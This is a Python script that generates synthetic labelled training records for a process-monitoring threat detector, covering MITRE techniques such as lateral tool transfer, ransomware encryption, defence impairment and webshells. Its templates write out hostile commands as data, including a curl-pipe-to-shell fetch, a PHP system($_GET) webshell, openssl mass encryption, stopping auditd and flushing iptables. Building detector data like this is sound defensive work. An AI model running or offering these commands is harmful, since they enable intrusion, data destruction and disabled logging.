#!/usr/bin/env python3
"""
Round 5 stretch threats — MITRE gaps from coverage/matrix.yaml:
  T1570 lateral tool transfer
  T1486 data encrypted for impact (ransomware-style)
  T1562.001 impair defenses (disable logging/AV)
  T1190 exploit public-facing application (webshell)

Merged with Bucket A as bucket=threat in stratified_merge.py.

RUN:
    python3 generate_stretch_threats.py --count 600 --out data/bucket_d_stretch.jsonl
"""

from __future__ import annotations

import argparse
import hashlib
import json
import random
from pathlib import Path

TS_MIN = 1749000000
TS_MAX = 1781300000

EVIL_IPS = [
    "185.220.101.45", "45.137.21.9", "194.165.16.78", "91.92.109.43",
]
LAN_IPS = ["192.168.0.12", "192.168.1.55", "10.0.0.8", "172.16.0.4"]
SENSITIVE = [
    "/etc/shadow", "/home/cosmic/.ssh/id_rsa", "/home/cosmic/Documents",
    "/var/www/html/index.php", "/etc/passwd",
]


def behavior_suffix(conns=None, files=None, kids=None):
    parts = ""
    if conns:
        parts += f" outbound_connections:[{','.join(sorted(conns))}]"
    if files:
        parts += f" sensitive_files:[{','.join(sorted(files))}]"
    if kids:
        parts += f" spawned_children:[{','.join(sorted(kids))}]"
    if not parts:
        parts = " behavior:none_observed"
    return parts


def format_guard_event(name, pid, uid, exe, cmd, ts, conns=None, files=None, kids=None):
    return (
        f"{name} PID:{pid} uid:{uid} exe:{exe} cmd:{cmd} time:{ts}"
        + behavior_suffix(conns, files, kids)
    )


def evil_conn(port):
    return f"{random.choice(EVIL_IPS)}:{port}"


def evil_exe():
    return random.choice(["/tmp/.x", "/dev/shm/.www", "/var/tmp/.update"])


TEMPLATES = [
    # T1570 — lateral movement via scp/rsync/ssh to internal host + payload
    dict(
        category="lateral_transfer",
        name=lambda: random.choice(["scp", "rsync", "ssh"]),
        exe=lambda: random.choice(["/usr/bin/scp", "/usr/bin/rsync", "/usr/bin/ssh"]),
        uid=[1000, 0],
        cmds=[
            "-o StrictHostKeyChecking=no cosmic@{ip}:/tmp/.x /dev/shm/.x",
            "-avz /tmp/.payload cosmic@{ip}:/tmp/",
            "cosmic@{ip} 'chmod +x /tmp/.x && /tmp/.x'",
        ],
        conns=lambda: [f"{random.choice(LAN_IPS)}:22", evil_conn(22)],
        files=lambda: ["/tmp/.payload", "/dev/shm/.x"],
        kids=lambda: ["ssh", "scp"][:1],
        mitre=["T1570", "T1021.004"],
        tags=["lateral", "internal_spray", "tmp_payload"],
        reasoning="Pushes a hidden payload to another host over SSH and executes it — lateral tool transfer.",
    ),
    dict(
        category="lateral_transfer",
        name=lambda: random.choice(["python3", ".x"]),
        exe=lambda: random.choice(["/tmp/.x", "/dev/shm/.agent"]),
        uid=[1000],
        cmds=["-c 'import socket;s=...'", "/tmp/stage2"],
        conns=lambda: [f"{random.choice(LAN_IPS)}:445", evil_conn(4444)],
        files=lambda: ["/home/cosmic/.ssh/known_hosts"],
        kids=lambda: ["sh"],
        mitre=["T1570"],
        tags=["lateral", "internal_recon"],
        reasoning="Staging binary scanning internal hosts and moving laterally.",
    ),
    # T1486 — ransomware / mass encrypt
    dict(
        category="ransomware_impact",
        name=lambda: random.choice(["openssl", ".enc", "python3"]),
        exe=lambda: random.choice(["/usr/bin/openssl", "/tmp/.enc", evil_exe()]),
        uid=[1000, 0],
        cmds=[
            "enc -aes-256-cbc -salt -in /home/cosmic/Documents -out /tmp/.locked",
            "-c 'for f in os.walk(\"/home/cosmic\"):...encrypt...'",
            "find /home/cosmic -name '*.locked' -delete",
        ],
        files=lambda: random.sample(
            ["/home/cosmic/Documents", "/home/cosmic/Pictures", "/etc/shadow"], k=2
        ),
        kids=lambda: ["find", "openssl"][: random.randint(1, 2)],
        mitre=["T1486", "T1490"],
        tags=["mass_encrypt", "impact", "reads_home"],
        reasoning="Mass encryption of user data with openssl or script — ransomware impact pattern.",
    ),
    dict(
        category="ransomware_impact",
        name=lambda: random.choice(["mv", "rename", ".x"]),
        exe=evil_exe,
        uid=[1000],
        cmds=["-v /home/cosmic/Documents/*.pdf /home/cosmic/Documents/*.locked"],
        files=lambda: [f"/home/cosmic/Documents/file{i}.locked" for i in range(3)],
        mitre=["T1486"],
        tags=["mass_rename", "impact"],
        reasoning="Bulk rename to .locked extension across Documents — encryption impact staging.",
    ),
    # T1562.001 — impair defenses
    dict(
        category="defense_impairment",
        name=lambda: random.choice(["iptables", "systemctl", "sh"]),
        exe=lambda: random.choice(["/usr/sbin/iptables", "/usr/bin/systemctl", "/bin/sh"]),
        uid=[0],
        cmds=[
            "-F", "stop auditd", "disable firewalld",
            "-c 'echo 0 > /proc/sys/kernel/yama/ptrace_scope'",
            "mask systemd-journald.service",
        ],
        files=lambda: ["/etc/iptables/rules.v4", "/etc/audit/auditd.conf"][:1],
        mitre=["T1562.001", "T1562"],
        tags=["disable_logging", "flush_firewall", "root_uid"],
        reasoning="Root process flushing firewall rules or stopping audit/logging — impair defenses.",
    ),
    dict(
        category="defense_impairment",
        name=lambda: random.choice(["rmmod", "killall", ".x"]),
        exe=lambda: random.choice(["/usr/sbin/rmmod", evil_exe()]),
        uid=[0],
        cmds=["audit", "killall -9 auditd", "-9 jett-daemon"],
        files=lambda: ["/var/log/audit/audit.log"] if random.random() < 0.5 else None,
        mitre=["T1562.001"],
        tags=["kill_security_daemon", "unload_module"],
        reasoning="Killing audit or security daemon / unloading kernel module — defense evasion.",
    ),
    # T1190 — public-facing exploit / webshell
    dict(
        category="initial_access_web",
        name=lambda: random.choice(["php-fpm", "apache2", "nginx", "python3"]),
        exe=lambda: random.choice([
            "/var/www/html/.shell.php", "/tmp/.www", "/usr/sbin/apache2",
        ]),
        uid=[33, 0, 1000],
        cmds=[
            "-c 'system($_GET[\"cmd\"]);'",
            "POST /upload.php",
            "-m http.server 8080",
        ],
        conns=lambda: [evil_conn(443), f"{random.choice(['203.0.113.5', '198.51.100.9'])}:8080"],
        files=lambda: ["/var/www/html/shell.php", "/var/www/html/upload.php"][:1],
        kids=lambda: ["sh", "bash", "wget"][: random.randint(1, 2)],
        mitre=["T1190", "T1505.003"],
        tags=["webshell", "public_facing", "spawns_shell"],
        reasoning="Web server process spawning shell from webroot or serving a webshell — initial access.",
    ),
    dict(
        category="initial_access_web",
        name=lambda: random.choice(["curl", "wget"]),
        exe=lambda: random.choice(["/usr/bin/curl", "/usr/bin/wget"]),
        uid=[33, 1000],
        cmds=["http://{ip}/exploit.sh | sh", "-O /var/www/html/backdoor.php"],
        conns=lambda: [evil_conn(80)],
        files=lambda: ["/var/www/html/backdoor.php"],
        kids=lambda: ["sh"],
        mitre=["T1190", "T1105"],
        tags=["web_exploit", "pipe_to_shell"],
        reasoning="Remote exploit payload fetched into webroot and executed — public app compromise.",
    ),
]


def rand_pid():
    return random.randint(800, 199999)


def resolve(v):
    return v() if callable(v) else v


def make_record(t):
    name = resolve(t["name"])
    exe = resolve(t["exe"])
    uid = random.choice(t["uid"]) if isinstance(t.get("uid"), list) else resolve(t.get("uid", 1000))
    cmd = random.choice(t["cmds"]) if t.get("cmds") else ""
    ts = random.randint(TS_MIN, TS_MAX)
    conns = resolve(t.get("conns")) if "conns" in t else None
    files = resolve(t.get("files")) if "files" in t else None
    kids = resolve(t.get("kids")) if "kids" in t else None
    ip = random.choice(LAN_IPS) if "{ip}" in cmd else ""
    cmd = cmd.replace("{ip}", ip)
    inp = format_guard_event(name, rand_pid(), uid, exe, cmd, ts, conns=conns, files=files, kids=kids)
    return {
        "bucket": "threat",
        "category": t["category"],
        "mitre": t.get("mitre", []),
        "tags": t.get("tags", []),
        "input": inp,
        "output": "QUARANTINE",
        "reasoning": t.get("reasoning", ""),
    }


def main():
    ap = argparse.ArgumentParser(description="jeTT Round 5 — stretch MITRE threats")
    ap.add_argument("--count", type=int, default=600)
    ap.add_argument("--out", default="data/bucket_d_stretch.jsonl")
    ap.add_argument("--seed", type=int, default=51)
    args = ap.parse_args()
    random.seed(args.seed)

    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    seen, written, attempts = set(), 0, 0
    by_cat = {}
    with out.open("w") as f:
        while written < args.count and attempts < args.count * 50:
            attempts += 1
            rec = make_record(random.choice(TEMPLATES))
            h = hashlib.sha1(rec["input"].encode()).hexdigest()
            if h in seen:
                continue
            seen.add(h)
            f.write(json.dumps(rec) + "\n")
            written += 1
            by_cat[rec["category"]] = by_cat.get(rec["category"], 0) + 1

    print(f"[+] wrote {written} stretch threats -> {out}")
    for c, n in sorted(by_cat.items(), key=lambda x: -x[1]):
        print(f"    {n:4d}  {c}")


if __name__ == "__main__":
    main()
